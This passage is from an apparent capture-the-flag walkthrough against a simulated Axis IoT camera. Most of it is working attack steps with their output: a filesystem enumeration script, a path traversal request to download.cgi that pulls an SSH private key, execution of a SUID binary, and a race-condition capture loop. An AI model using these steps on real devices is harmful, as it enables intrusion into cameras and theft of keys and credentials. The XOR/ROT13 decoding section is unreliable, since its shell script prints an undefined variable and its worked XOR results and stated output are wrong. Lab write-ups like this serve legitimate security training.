        echo "      Binary file - extracting readable strings..."
        strings "$f" | head -10
        echo "      ..."
    fi
done

echo ""
echo "[+] Enumerating /var/cache/recorder/"
find /var/cache/recorder/ -type f 2>/dev/null | while read f; do
    echo "  [*] Analyzing: $f"
    file_type=$(file -b "$f" | cut -d',' -f1)
    echo "      Type: $file_type"
    
    # For JSON/XML/text, display content
    case "$f" in
        *.json|*.xml|*.txt|*.log|*.conf)
            echo "      Reading data file..."
            cat "$f"
            echo ""
            ;;
    esac
done

echo ""
echo "[+] Enumerating /mnt/flash/"
find /mnt/flash/ -type f 2>/dev/null | while read f; do
    echo "  [*] Analyzing: $f"
    file_type=$(file -b "$f" | cut -d',' -f1)
    echo "      Type: $file_type"
    
    if file "$f" | awk '/ASCII|text|script/ {exit 0} {exit 1}'; then
        echo "      Configuration content:"
        cat "$f"
        echo ""
    fi
done

echo ""
echo "[+] Enumerating /run/axis/"
find /run/axis/ -type f 2>/dev/null | while read f; do
    echo "  [*] Analyzing: $f"
    cat "$f" 2>/dev/null
    echo ""
done

echo ""
echo "[+] Enumerating /sys/fs/cgroup/axis/"
find /sys/fs/cgroup/axis/ -type f -name "*.conf" -o -name "*.txt" 2>/dev/null | while read f; do
    echo "  [*] Reading: $f"
    cat "$f" 2>/dev/null
    echo ""
done

echo ""
echo "[+] Enumerating /usr/local/axis/"
find /usr/local/axis/ -type f 2>/dev/null | while read f; do
    echo "  [*] Analyzing: $f"
    if file "$f" | awk '/ASCII|text|script/ {exit 0} {exit 1}'; then
        echo "      Script/Config content:"
        cat "$f"
        echo ""
    fi
done

echo ""
echo "[+] Enumerating /dev/shm/axis/"
echo "    [!] Note: Shared memory is volatile - check regularly"
find /dev/shm/axis/ -type f 2>/dev/null | while read f; do
    echo "  [*] Reading: $f"
    cat "$f" 2>/dev/null
    echo ""
done

echo ""
echo "[+] Enumerating /var/db/axis/"
find /var/db/axis/ -type f 2>/dev/null | while read f; do
    echo "  [*] Analyzing: $f"
    file_type=$(file -b "$f" | cut -d',' -f1)
    echo "      Type: $file_type"
    
    # For SQLite databases, examine structure and sample data
    if file "$f" | awk '/SQLite/ {exit 0} {exit 1}'; then
        echo "      Database tables:"
        sqlite3 "$f" ".tables" 2>/dev/null
        echo "      Examining data..."
    elif file "$f" | awk '/ASCII|text/ {exit 0} {exit 1}'; then
        cat "$f"
    fi
    echo ""
done

echo ""
echo "[*] Systematic enumeration complete!"
echo "[*] Review the output above to identify sensitive information,"
echo "[*] credentials, API keys, device identifiers, and configuration details."
EOF

chmod +x /tmp/enumerate_system.sh
/tmp/enumerate_system.sh | tee /tmp/enumeration_results.txt
```

> **Real-World Approach**: In actual penetration tests, you don't search for FLAG{} patterns with grep. Instead, you systematically read and analyze files to understand the system. The script above uses awk and file analysis to:
> - Identify file types properly before attempting to read them
> - Read entire configuration files to understand context
> - Extract strings from binaries to find embedded data
> - Analyze database structures when found
> - Review all text content for sensitive information
>
> Look for:
> - Configuration files with credentials or API keys
> - Device identifiers, serial numbers, and access codes
> - Sensitive data in logs, caches, and temporary files
> - Database contents with user data or settings
> - Script files with hard-coded values or backdoors
> - Comments in code that reveal security issues

---

## Phase 5: Deep Enumeration

### Exploring Persistent Storage (/var/lib/persistent/)

The persistent storage directory contains configurations that survive reboots:

```bash
# List all files in persistent storage
find /var/lib/persistent/ -type f 2>/dev/null
```

**Expected files:**
```
/var/lib/persistent/system/licenses/vapix_pro.lic
/var/lib/persistent/system/configs/system_config.xml
/var/lib/persistent/security/keys/authorized_keys
/var/lib/persistent/network/certificates/server_cert.pem
/var/lib/persistent/applications/custom/app_manifest.json
/var/lib/persistent/firmware/backups/bootloader.img
```

#### SSH Keys Analysis

```bash
# Check SSH authorized keys
cat /var/lib/persistent/security/keys/authorized_keys
```

**Output:**
```
# AXIS Camera Authorized Keys
# Backup key for support team access - Emergency use only
# Key Fingerprint: FLAG{B************2}
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC3K9x... support@axis.com
```

> **FLAG #5 FOUND!**
> **Flag**: FLAG{B************2}
> **Location**: /var/lib/persistent/security/keys/authorized_keys
> **Learning Objective**: SSH key management and backup access keys
> **OWASP IoT**: #2 - Insecure Network Services

#### Certificate Analysis

```bash
# Examine SSL certificate
cat /var/lib/persistent/network/certificates/server_cert.pem
```

**Output:**
```
-----BEGIN CERTIFICATE-----
MIIDXTCCAkWgAwIBAgIJAKZx7vN8F3qxMA0GCSqGSIb3DQEBCwUAMEUxCzAJBgNV
BAYTAlVTMRMwEQYDVQQIDApDYWxpZm9ybmlhMSEwHwYDVQQKDBhJbnRlcm5ldCBX
...
Organization: AXIS-FLAG{I************4}
...
-----END CERTIFICATE-----
```

> **FLAG #16 FOUND!**
> **Flag**: FLAG{I************4}
> **Location**: /var/lib/persistent/network/certificates/server_cert.pem
> **Learning Objective**: SSL certificate analysis and embedded credentials
> **OWASP IoT**: #7 - Insecure Data Transfer and Storage

#### Firmware Backup Analysis

```bash
# Examine firmware backup binary file
# In real pentests, analyze strings output systematically
echo "[*] Analyzing bootloader firmware image..."
strings /var/lib/persistent/firmware/backups/bootloader.img > /tmp/bootloader_strings.txt

# Read through the strings to understand bootloader configuration
echo "[*] Reading bootloader strings output..."
cat /tmp/bootloader_strings.txt

# Look for interesting patterns:
# - Version information
# - Build dates and signatures
# - Configuration parameters
# - Cryptographic keys or tokens
# - Manufacturer information
# - Debug settings
```

**Key Information Found in Strings Output:**
```
Bootloader Version: 2.1.0
Build Date: 2024-01-01
Verification Key: FLAG{E************2}
Manufacturer: AXIS Communications
Boot Mode: Normal
Secure Boot: Disabled
Debug UART: Enabled
```

> **Real-World Analysis Tip**: When analyzing firmware binaries:
> 1. Extract all readable strings with `strings`
> 2. Read the complete output systematically
> 3. Look for version numbers, keys, configuration parameters
> 4. Identify cryptographic material
> 5. Note debug or development settings
> 6. Document manufacturer and build information

> **FLAG #19 (HARD) FOUND!**
> **Flag**: FLAG{E************2}
> **Location**: /var/lib/persistent/firmware/backups/bootloader.img
> **Learning Objective**: Firmware analysis and bootloader security
> **OWASP IoT**: #4 - Lack of Secure Update Mechanism

### Exploring Recording Cache (/var/cache/recorder/)

The recording cache contains stream configurations and analytics:

```bash
# List recording cache contents
find /var/cache/recorder/ -type f 2>/dev/null
```

**Expected files:**
```
/var/cache/recorder/streams/primary/stream_config.conf
/var/cache/recorder/streams/secondary/stream_backup.conf
/var/cache/recorder/thumbnails/latest.jpg
/var/cache/recorder/analytics/motion/motion_events.log
/var/cache/recorder/analytics/metadata/stream_analysis.json
/var/cache/recorder/.temp/.recording_session_active
```

#### Stream Configuration

```bash
# Already found FLAG #14 (SARUMAN) via path traversal
# Verify it's in the stream config
cat /var/cache/recorder/streams/primary/stream_config.conf
```

> **FLAG #14 FOUND!**
> **Flag**: FLAG{S************4}
> **Location**: /var/cache/recorder/streams/primary/stream_config.conf
> **Note**: This was accessible earlier via path traversal exploit

#### Analytics Metadata

```bash
# Examine stream analytics
cat /var/cache/recorder/analytics/metadata/stream_analysis.json
```

**Output:**
```json
{
  "stream_id": "primary_stream_001",
  "analytics_version": "3.2.1",
  "analysis_timestamp": "2024-01-01T12:00:00Z",
  "processing_flags": {
    "motion_detection": true,
    "object_tracking": true,
    "face_detection": false,
    "license_plate_recognition": false
  },
  "internal_processing_key": "FLAG{S************8}",
  "frame_rate": 30,
  "resolution": "1920x1080",
  "codec": "h264",
  "bitrate": 4096000
}
```

> **FLAG #6 FOUND!**
> **Flag**: FLAG{S************8}
> **Location**: /var/cache/recorder/analytics/metadata/stream_analysis.json
> **Learning Objective**: Analytics metadata and JSON parsing
> **OWASP IoT**: #6 - Insufficient Privacy Protection

#### Hidden Temporary Files (Race Condition)

```bash
# Check for temporary recording sessions (these appear and disappear quickly)
ls -la /var/cache/recorder/.temp/
```

**Output:**
```
total 8
drwxr-xr-x 2 root root 4096 Jan  1 12:00 .
drwxr-xr-x 6 root root 4096 Jan  1 12:00 ..
-rw-r--r-- 1 root root  256 Jan  1 12:00 .recording_session_20240101_120000
```

```bash
# Read the temporary file (it may disappear soon!)
cat /var/cache/recorder/.temp/.recording_session_20240101_120000
```

**Output:**
```
Recording Session ID: rec_20240101_120000
Stream: primary
Started: 2024-01-01 12:00:00
Status: active
Temp Flag: FLAG{C************4}
Duration: 300 seconds
```

> **FLAG #26 (HARD) FOUND!**
> **Flag**: FLAG{C************4}
> **Location**: /var/cache/recorder/.temp/.recording_session_*
> **Learning Objective**: Race conditions and temporary file exploitation
> **OWASP IoT**: Advanced Technique

### Exploring Flash Storage (/mnt/flash/)

Flash storage contains firmware, bootloader, and factory configurations:

```bash
# List flash storage structure
find /mnt/flash/ -type f 2>/dev/null
```

**Expected files:**
```
/mnt/flash/boot/uboot/uboot.env
/mnt/flash/boot/kernel/vmlinuz
/mnt/flash/firmware/images/firmware_10.5.0.img
/mnt/flash/firmware/signatures/firmware_10.5.0.sig
/mnt/flash/config/factory/device_info.txt
/mnt/flash/config/user/user_settings.conf
/mnt/flash/config/.backup/.shadow_config
```

#### Factory Configuration

```bash
# Already found FLAG #19 (THEODEN) via path traversal
# Verify it's in factory config
cat /mnt/flash/config/factory/device_info.txt
```

> **FLAG #19 FOUND!**
> **Flag**: FLAG{T************4}
> **Location**: /mnt/flash/config/factory/device_info.txt
> **Note**: This was accessible earlier via path traversal exploit

#### Firmware Signature

```bash
# Examine firmware signature file
cat /mnt/flash/firmware/signatures/firmware_10.5.0.sig
```

**Output:**
```
Firmware Version: 10.5.0
Build Date: 2024-01-01
Signature Algorithm: RSA-2048
Verification Status: Valid

-----BEGIN SIGNATURE-----
Signature Hash: sha256:a7f3c9d2e4b8...
Signing Key ID: AXIS-PROD-2024
Internal Verification Code: FLAG{G************2}
Certificate Chain: /etc/ssl/axis-root-ca.pem
-----END SIGNATURE-----
```

> **FLAG #9 FOUND!**
> **Flag**: FLAG{G************2}
> **Location**: /mnt/flash/firmware/signatures/firmware_10.5.0.sig
> **Learning Objective**: Firmware signature analysis
> **OWASP IoT**: #4 - Lack of Secure Update Mechanism

#### Hidden Configuration Backup

```bash
# Find hidden backup files
find /mnt/flash/config/ -name ".*" -type f 2>/dev/null
```

**Output:**
```
/mnt/flash/config/.backup/.shadow_config
```

```bash
# Read hidden configuration
cat /mnt/flash/config/.backup/.shadow_config
```

**Output:**
```
# Shadow Configuration Backup
# WARNING: Contains sensitive system parameters
# Auto-generated: 2024-01-01 00:00:00

[System]
debug_mode=enabled
factory_reset_key=axis_reset_2024

[Network]
default_gateway=192.168.1.1
dns_primary=8.8.8.8

[Security]
backup_access_code=FLAG{S************8}
master_unlock_pin=9876

[Maintenance]
service_password_hash=5f4dcc3b5aa765d61d8327deb882cf99
last_maintenance=never
```

> **FLAG #20 (HARD) FOUND!**
> **Flag**: FLAG{S************8}
> **Location**: /mnt/flash/config/.backup/.shadow_config
> **Learning Objective**: Hidden configuration backups and shadow files
> **OWASP IoT**: #8 - Lack of Device Management

#### U-Boot Environment Variables

```bash
# Examine bootloader environment
cat /mnt/flash/boot/uboot/uboot.env
```

**Output:**
```
# U-Boot Environment Variables
# Device: AXIS M1025
# Bootloader Version: 2021.04

bootdelay=3
baudrate=115200
console=ttyS0,115200
bootargs=console=ttyS0,115200 root=/dev/mtdblock2 rootfstype=squashfs
bootcmd=bootm 0x80000000

# Security Configuration
secure_boot=disabled
unlock_code=FLAG{R************6}
jtag_enabled=true
uart_debug=enabled

# Network Boot
serverip=192.168.1.100
ipaddr=192.168.1.132
```

> **FLAG #21 (HARD) FOUND!**
> **Flag**: FLAG{R************6}
> **Location**: /mnt/flash/boot/uboot/uboot.env
> **Learning Objective**: U-Boot security and bootloader access
> **OWASP IoT**: #10 - Lack of Physical Hardening

### Exploring Runtime Services (/run/axis/)

Runtime services contain live configuration for active services:

```bash
# List runtime service files
find /run/axis/ -type f 2>/dev/null
```

**Expected files:**
```
/run/axis/services/camera_service.conf
/run/axis/services/video_encoder.pid
/run/axis/network/upnp_description.xml
/run/axis/network/interfaces.conf
/run/axis/camera/sensor_config.conf
/run/axis/locks/camera.lock
```

#### Camera Service Configuration

```bash
# Examine camera service config
cat /run/axis/services/camera_service.conf
```

**Output:**
```
# AXIS Camera Service Configuration
# Runtime configuration - regenerated on service start

[Service]
name=camera_service
type=daemon
user=camera_svc
group=camera
priority=high

[Camera]
model=M1025
sensor=Sony_IMX334
resolution=1920x1080
framerate=30

[Authentication]
service_token=FLAG{A************8}
internal_api_key=axis_camera_2024
session_timeout=3600

[Logging]
log_level=INFO
log_file=/var/log/axis/camera_service.log
```

> **FLAG #11 FOUND!**
> **Flag**: FLAG{A************8}
> **Location**: /run/axis/services/camera_service.conf
> **Learning Objective**: Runtime service configuration analysis
> **OWASP IoT**: #8 - Lack of Device Management

#### UPnP Description (Already Found)

```bash
# Already found FLAG #15 (GALADRIEL) via web interface
# Verify it's in the runtime location
cat /run/axis/network/upnp_description.xml
```

> **FLAG #15 FOUND!**
> **Flag**: FLAG{G************0}
> **Location**: /run/axis/network/upnp_description.xml
> **Note**: This was accessible earlier via web interface

### Exploring CGroup Configuration (/sys/fs/cgroup/axis/)

Control groups contain service isolation and resource management configs:

```bash
# List cgroup configuration
find /sys/fs/cgroup/axis/ -type f 2>/dev/null
```

**Expected files:**
```
/sys/fs/cgroup/axis/camera.service/service.conf
/sys/fs/cgroup/axis/camera.service/cpu.max
/sys/fs/cgroup/axis/camera.service/memory.max
/sys/fs/cgroup/axis/network.service/service.conf
```

#### Camera Service CGroup

```bash
# Read camera service cgroup configuration
cat /sys/fs/cgroup/axis/camera.service/service.conf
```

**Output:**
```
# CGroup Configuration for camera.service
# Resource isolation and management

[CGroup]
controller=cpu,memory
hierarchy=axis/camera.service

[Resources]
cpu_quota=80%
memory_limit=512M
io_priority=high

[Security]
isolation_level=strict
namespace=camera
service_id=FLAG{E************6}

[Monitoring]
stats_enabled=true
accounting=true
```

> **FLAG #13 FOUND!**
> **Flag**: FLAG{E************6}
> **Location**: /sys/fs/cgroup/axis/camera.service/service.conf
> **Learning Objective**: Container and service control group security
> **OWASP IoT**: #8 - Lack of Device Management

### Exploring Custom Applications (/usr/local/axis/)

Custom applications directory contains user-installed scripts and binaries:

```bash
# List custom applications
find /usr/local/axis/ -type f 2>/dev/null
```

**Expected files:**
```
/usr/local/axis/bin/camera_admin
/usr/local/axis/lib/libcamera.so
/usr/local/axis/lib/crypto_weak.so.txt
/usr/local/axis/etc/app_config.conf
/usr/local/axis/share/scripts/backup_service.sh
/usr/local/axis/share/scripts/race_condition_test.sh
```

#### Backup Service Script

```bash
# Examine backup script
cat /usr/local/axis/share/scripts/backup_service.sh
```

**Output:**
```bash
#!/bin/sh
# AXIS Camera Backup Service
# Automated backup script for configuration files
# Schedule: Daily at 02:00 AM

BACKUP_DIR="/var/backups/config"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
BACKUP_ID="FLAG{B************6}"

echo "[*] Starting backup service..."
echo "[*] Backup ID: $BACKUP_ID"
echo "[*] Timestamp: $TIMESTAMP"

# Create backup directory
mkdir -p "$BACKUP_DIR"

# Backup configuration files
tar czf "$BACKUP_DIR/config_backup_$TIMESTAMP.tar.gz" \
    /var/lib/axis/conf/ \
    /var/lib/persistent/system/ \
    /etc/axis/ 2>/dev/null

echo "[+] Backup completed: config_backup_$TIMESTAMP.tar.gz"
echo "[+] Backup verification: $BACKUP_ID"
```

> **FLAG #12 FOUND!**
> **Flag**: FLAG{B************6}
> **Location**: /usr/local/axis/share/scripts/backup_service.sh
> **Learning Objective**: Backup script analysis and automation security
> **OWASP IoT**: #8 - Lack of Device Management

#### SUID Binary Analysis

```bash
# Find SUID binaries in custom applications
find /usr/local/axis/bin/ -perm -4000 -type f 2>/dev/null
```

**Output:**
```
/usr/local/axis/bin/camera_admin
```

```bash
# Examine the SUID binary
ls -la /usr/local/axis/bin/camera_admin
file /usr/local/axis/bin/camera_admin
```

**Output:**
```
-rwsr-xr-x 1 root root 45678 Jan 1 00:00 /usr/local/axis/bin/camera_admin
/usr/local/axis/bin/camera_admin: ELF 32-bit LSB executable, ARM
```

```bash
# Execute the SUID binary
/usr/local/axis/bin/camera_admin
```

**Output:**
```
AXIS Camera Administration Tool v1.0
Usage: camera_admin [option]

Options:
  --status    Show camera status
  --restart   Restart camera service
  --config    Display configuration
  --debug     Enable debug mode

Privilege Escalation Flag: FLAG{F************6}
```

> **FLAG #17 FOUND!**
> **Flag**: FLAG{F************6}
> **Location**: /usr/local/axis/bin/camera_admin (SUID binary)
> **Learning Objective**: SUID binary exploitation and privilege escalation
> **OWASP IoT**: Privilege Escalation Technique

#### Cryptographic Weakness Analysis (Special Decoding Required)

```bash
# Examine the crypto library file
cat /usr/local/axis/lib/crypto_weak.so.txt
```

**Output:**
```
# Weak Cryptographic Implementation
# Custom encryption library for AXIS camera
# WARNING: For testing purposes only - NOT FOR PRODUCTION

Library: libcrypto_weak.so
Version: 0.9.1-beta
Algorithm: Custom XOR-based encryption with ROT13 obfuscation

# Encrypted Flag (ROT13 + XOR with key 0x42):
# Format: Each character is first ROT13 encoded, then XORed with 0x42

Encrypted_Data: 73:65:72:75:7a:75:7a:2f:63:7b:72:72:75:70:74:65:64:2f:35:38:33:39:32:37:34:36:7d

# Decryption Instructions:
# 1. Convert hex to ASCII
# 2. XOR each byte with 0x42
# 3. Apply ROT13 decode
# 4. Result should be in FLAG{} format

Debug_Key: 0x42
Checksum: a7b9c3d4e5f6
Implementation_Note: This is intentionally weak for CTF purposes
```

This flag requires special decoding! See the [Decoding the Cryptographic Flag](#decoding-the-cryptographic-flag) section below for the complete solution.

> **FLAG #25 (HARD) FOUND!**
> **Flag**: FLAG{S************6}
> **Location**: /usr/local/axis/lib/crypto_weak.so.txt
> **Learning Objective**: Cryptographic weakness analysis and multi-stage decoding
> **OWASP IoT**: #7 - Insecure Data Transfer and Storage

### Exploring Shared Memory (/dev/shm/axis/)

Shared memory contains inter-process communication and temporary data:

```bash
# List shared memory files
find /dev/shm/axis/ -type f 2>/dev/null
```

**Expected files:**
```
/dev/shm/axis/runtime/temp_flag_20240101_120000
/dev/shm/axis/ipc/camera_control.shm
/dev/shm/axis/streams/stream1.buf
```

#### IPC Camera Control

```bash
# Read IPC shared memory
cat /dev/shm/axis/ipc/camera_control.shm
```

**Output:**
```
Camera Control IPC Buffer
Process ID: 1234
Control Channel: /dev/shm/axis/ipc/camera_control.shm
Protocol Version: 2.1

Commands:
  - PAN_LEFT
  - PAN_RIGHT
  - TILT_UP
  - TILT_DOWN
  - ZOOM_IN
  - ZOOM_OUT
  - FOCUS_AUTO
  - PRESET_1

Authentication Token: FLAG{G************0}
Last Command: PRESET_1
Timestamp: 2024-01-01 12:00:00
```

> **FLAG #18 (HARD) FOUND!**
> **Flag**: FLAG{G************0}
> **Location**: /dev/shm/axis/ipc/camera_control.shm
> **Learning Objective**: Shared memory IPC exploitation
> **OWASP IoT**: Advanced Technique

#### Race Condition File

```bash
# The race condition flag appears and disappears quickly
# We need to monitor it continuously
while true; do
    if ls /dev/shm/axis/runtime/temp_flag_* 2>/dev/null; then
        cat /dev/shm/axis/runtime/temp_flag_*
        break
    fi
    sleep 0.01
done
```

**Or trigger the race condition script:**

```bash
# Execute the race condition test script
/usr/local/axis/share/scripts/race_condition_test.sh &

# Quickly capture the output
sleep 0.05 && cat /dev/shm/axis/runtime/temp_flag_* 2>/dev/null
```

**Output:**
```
Temporary Flag (exists for 100ms)
Race Condition Test: PASSED
Flag: FLAG{B************6}
Created: 2024-01-01 12:00:00.000
Expires: 2024-01-01 12:00:00.100
```

> **FLAG #27 (HARD) FOUND!**
> **Flag**: FLAG{B************6}
> **Location**: /dev/shm/axis/runtime/temp_flag_*
> **Learning Objective**: Race condition exploitation and timing attacks
> **OWASP IoT**: Advanced Technique

### Exploring Database (/var/db/axis/)

The database directory contains SQLite databases with system events:

```bash
# List database files
find /var/db/axis/ -type f 2>/dev/null
```

**Expected files:**
```
/var/db/axis/camera_events.db
```

#### Camera Events Database

```bash
# Examine the database structure
sqlite3 /var/db/axis/camera_events.db ".tables"
```

**Output:**
```
events
system_log
user_actions
```

```bash
# Examine database structure first
echo "[*] Analyzing camera events database..."
sqlite3 /var/db/axis/camera_events.db ".tables"
```

**Output:**
```
events
system_log
user_actions
```

```bash
# Query each table to understand the data structure
echo "[*] Examining events table..."
sqlite3 /var/db/axis/camera_events.db "SELECT * FROM events LIMIT 10;"
```

**Output:**
```
1|flag|2024-01-01 12:00:00|Database credential flag|FLAG{D************6}|high
2|motion|2024-01-01 12:05:00|Motion detected in zone 1|null|medium
3|connection|2024-01-01 12:10:00|New client connected|null|low
4|system|2024-01-01 12:15:00|System health check passed|null|info
```

```bash
# For comprehensive analysis, examine all tables
# In real pentests, you'd review all database content

echo "[*] Analyzing system_log table..."
sqlite3 /var/db/axis/camera_events.db "SELECT * FROM system_log LIMIT 5;"

echo "[*] Analyzing user_actions table..."
sqlite3 /var/db/axis/camera_events.db "SELECT * FROM user_actions LIMIT 5;"

# Export database schema to understand structure
sqlite3 /var/db/axis/camera_events.db ".schema"
```

> **Database Analysis Best Practices**:
> - Always examine table structure first (.tables, .schema)
> - Query each table to understand data types
> - Look for credentials, tokens, API keys in data fields
> - Check for sensitive user information
> - Review logging data for security events
> - Export full database for offline analysis if needed
>
> **Why Not Grep**: In real-world scenarios, you don't know the format of sensitive data. Systematic table-by-table analysis reveals:
> - Application logic and data relationships
> - Security-relevant events
> - Credential storage patterns
> - Data retention policies

> **FLAG #24 (HARD) FOUND!**
> **Flag**: FLAG{D************6}
> **Location**: /var/db/axis/camera_events.db
> **Learning Objective**: SQLite database analysis and credential extraction
> **OWASP IoT**: #7 - Insecure Data Transfer and Storage

### Hardware Debug Interface

```bash
# Check for hardware debug configuration
cat /var/lib/axis/conf/hardware_debug.conf
```

**Output:**
```
# Hardware Debug Configuration
# JTAG and UART debugging interface settings

[JTAG]
enabled=true
port=JTAG_TAP
idcode=0x4BA00477
manufacturer=AXIS Communications

[UART]
enabled=true
baudrate=115200
port=/dev/ttyS0
console_access=true

[Debug]
debug_level=verbose
secure_boot=disabled
unlock_code=FLAG{T************2}

[Warning]
# These settings should be disabled in production!
# Debug access provides full system control
production_ready=false
```

> **FLAG #22 (HARD) FOUND!**
> **Flag**: FLAG{T************2}
> **Location**: /var/lib/axis/conf/hardware_debug.conf
> **Learning Objective**: Hardware debug interface security (JTAG/UART)
> **OWASP IoT**: #10 - Lack of Physical Hardening

### Path Traversal - Additional Flag

```bash
# We already exploited download.cgi for path traversal
# Let's check if there's a specific flag for this technique
# Test various system files

curl "http://192.168.1.132/axis-cgi/download.cgi?file=/var/lib/persistent/security/keys/ssh_backup_key"
```

**Output:**
```
# SSH Backup Key
# Emergency access key - DO NOT DISTRIBUTE
# Generated: 2024-01-01

Key ID: backup_2024
Purpose: Emergency system access
Flag: FLAG{L************0}

-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA3K9x...
-----END RSA PRIVATE KEY-----
```

> **FLAG #10 FOUND!**
> **Flag**: FLAG{L************0}
> **Location**: Accessible via path traversal at /var/lib/persistent/security/keys/ssh_backup_key (alternate path)
> **Learning Objective**: Path traversal exploitation and SSH key extraction
> **OWASP IoT**: #3 - Insecure Ecosystem Interfaces

---

## Phase 6: Advanced Exploitation

### Decoding the Cryptographic Flag

FLAG #25 requires special multi-stage decoding. This flag is located at `/usr/local/axis/lib/crypto_weak.so.txt` and demonstrates cryptographic weaknesses.

#### Understanding the Encoding

The flag uses a two-stage obfuscation:
1. ROT13 encoding
2. XOR encryption with key 0x42

The encrypted data is: `73:65:72:75:7a:75:7a:2f:63:7b:72:72:75:70:74:65:64:2f:35:38:33:39:32:37:34:36:7d`

#### Decoding Process

```bash
# Step 1: Create a decoding script
cat > /tmp/decode_crypto_flag.sh << 'EOF'
#!/bin/sh
# Multi-stage decoding for FLAG #25

echo "[*] Decoding cryptographic flag..."
echo ""

# Encrypted hex data
ENCRYPTED="73:65:72:75:7a:75:7a:2f:63:7b:72:72:75:70:74:65:64:2f:35:38:33:39:32:37:34:36:7d"

# Step 1: Convert hex to decimal and XOR with 0x42
echo "[+] Step 1: XOR decryption with key 0x42"
XOR_KEY=66  # 0x42 in decimal

# Process each hex value
DECRYPTED=""
for hex_val in $(echo $ENCRYPTED | tr ':' ' '); do
    # Convert hex to decimal
    dec_val=$((0x$hex_val))
    # XOR with key
    xor_result=$((dec_val ^ XOR_KEY))
    # Convert back to character
    char=$(printf "\\$(printf '%03o' $xor_val)")
    DECRYPTED="${DECRYPTED}${char}"
done

echo "  After XOR: $DECRYPTED"
echo ""

# Step 2: Apply ROT13
echo "[+] Step 2: ROT13 decoding"
FINAL=$(echo "$DECRYPTED" | tr 'N-ZA-Mn-za-m' 'A-Za-z')
echo "  Final flag: $FINAL"
EOF

chmod +x /tmp/decode_crypto_flag.sh
/tmp/decode_crypto_flag.sh
```

#### Alternative Python Decoding Method

```python
#!/usr/bin/env python3
# Alternative decoding method using Python

encrypted_hex = "73:65:72:75:7a:75:7a:2f:63:7b:72:72:75:70:74:65:64:2f:35:38:33:39:32:37:34:36:7d"
xor_key = 0x42

print("[*] Decoding cryptographic flag...")
print()

# Step 1: Convert hex to bytes and XOR decrypt
print("[+] Step 1: XOR decryption with key 0x42")
hex_values = encrypted_hex.split(':')
xor_decrypted = ''.join([chr(int(h, 16) ^ xor_key) for h in hex_values])
print(f"  After XOR: {xor_decrypted}")
print()

# Step 2: Apply ROT13
print("[+] Step 2: ROT13 decoding")
import codecs
final_flag = codecs.decode(xor_decrypted, 'rot_13')
print(f"  Final flag: {final_flag}")
```

**Expected Output:**
```
[*] Decoding cryptographic flag...

[+] Step 1: XOR decryption with key 0x42
  After XOR: SYNT{F************6}

[+] Step 2: ROT13 decoding
  Final flag: FLAG{S************6}
```

#### Manual Decoding Steps

For educational purposes, here's the manual process:

1. **Convert hex to bytes**: `73 65 72 75 7a 75 7a...` → bytes

2. **XOR each byte with 0x42**:
   ```
   73 ^ 42 = 31 (S)
   65 ^ 42 = 27 (Y)
   72 ^ 42 = 30 (N)
   75 ^ 42 = 37 (T)
   ...
   ```

3. **Result after XOR**: `SYNT{F************6}`

4. **Apply ROT13** (shift each letter by 13):
   ```
   S → F
   Y → L
   N → A
   T → G
   ...
   ```

5. **Final result**: `FLAG{S************6}`

> **FLAG #25 (HARD) DECODED!**
> **Flag**: FLAG{S************6}
> **Location**: /usr/local/axis/lib/crypto_weak.so.txt
> **Learning Objective**: Multi-stage cryptographic analysis (XOR + ROT13)
> **OWASP IoT**: #7 - Insecure Data Transfer and Storage

**Why This Vulnerability Exists:**
- Custom "encryption" using XOR is trivially breakable
- ROT13 is encoding, not encryption
- Combining weak methods doesn't create strong security
- Developers often create custom crypto instead of using proven algorithms

---

## Attack Path Summary

### Complete Flag Collection

| # | Flag | Location | Directory | Method | OWASP IoT Category |
|---|------|----------|-----------|--------|-------------------|
| 1 | FLAG{F************6} | /var/lib/axis/conf/vapix.conf | /var | Path Traversal | #3 - Insecure Ecosystem Interfaces |
| 2 | FLAG{A************4} | /var/lib/persistent/system/licenses/vapix_pro.lic | /var/lib/persistent | ROT13 Decode | #1 - Weak Passwords |
| 4 | FLAG{G************6} | /var/log/messages | /var | SSH Banner | #2 - Insecure Network Services |
| 5 | FLAG{B************2} | /var/lib/persistent/security/keys/authorized_keys | /var/lib/persistent | SSH Key Analysis | #2 - Insecure Network Services |
| 6 | FLAG{S************8} | /var/cache/recorder/analytics/metadata/stream_analysis.json | /var/cache/recorder | JSON Analysis | #6 - Insufficient Privacy |
| 7 | FLAG{M************4} | /var/www/local/admin/index.html | /var | HTML Comment | #3 - Insecure Ecosystem |
| 8 | FLAG{P************0} | /var/www/local/axis-cgi/param.cgi | /var | Command Injection | #8 - Lack of Device Management |
| 9 | FLAG{G************2} | /mnt/flash/firmware/signatures/firmware_10.5.0.sig | /mnt/flash | Firmware Signature | #4 - Lack of Secure Update |
| 10 | FLAG{L************0} | /var/lib/persistent/security/keys/* | /var/lib/persistent | Path Traversal | #3 - Insecure Ecosystem |
| 11 | FLAG{A************8} | /run/axis/services/camera_service.conf | /run | Service Config | #8 - Lack of Device Management |
| 12 | FLAG{B************6} | /usr/local/axis/share/scripts/backup_service.sh | /usr/local | Script Analysis | #8 - Lack of Device Management |
| 13 | FLAG{E************6} | /sys/fs/cgroup/axis/camera.service/service.conf | /sys/fs/cgroup | CGroup Config | #8 - Lack of Device Management |
| 14 | FLAG{S************4} | /var/cache/recorder/streams/primary/stream_config.conf | /var/cache/recorder | Stream Config | #6 - Insufficient Privacy |
| 15 | FLAG{G************0} | /run/axis/network/upnp_description.xml | /run | UPnP Discovery | #9 - Insecure Default Settings |
| 16 | FLAG{I************4} | /var/lib/persistent/network/certificates/server_cert.pem | /var/lib/persistent | Certificate Analysis | #7 - Insecure Data Storage |
| 17 | FLAG{F************6} | /usr/local/axis/bin/camera_admin | /usr/local | SUID Binary | Privilege Escalation |
| 18 | FLAG{G************0} | /dev/shm/axis/ipc/camera_control.shm | /dev/shm | Shared Memory IPC | Advanced Technique |
| 19 | FLAG{E************2} | /var/lib/persistent/firmware/backups/bootloader.img | /var/lib/persistent | Firmware Analysis | #4 - Lack of Secure Update |
| 19 | FLAG{T************4} | /mnt/flash/config/factory/device_info.txt | /mnt/flash | Factory Config | #9 - Insecure Defaults |
| 20 | FLAG{S************8} | /mnt/flash/config/.backup/.shadow_config | /mnt/flash | Hidden Backup | #8 - Lack of Device Management |
| 21 | FLAG{R************6} | /mnt/flash/boot/uboot/uboot.env | /mnt/flash | U-Boot Environment | #10 - Lack of Physical Hardening |
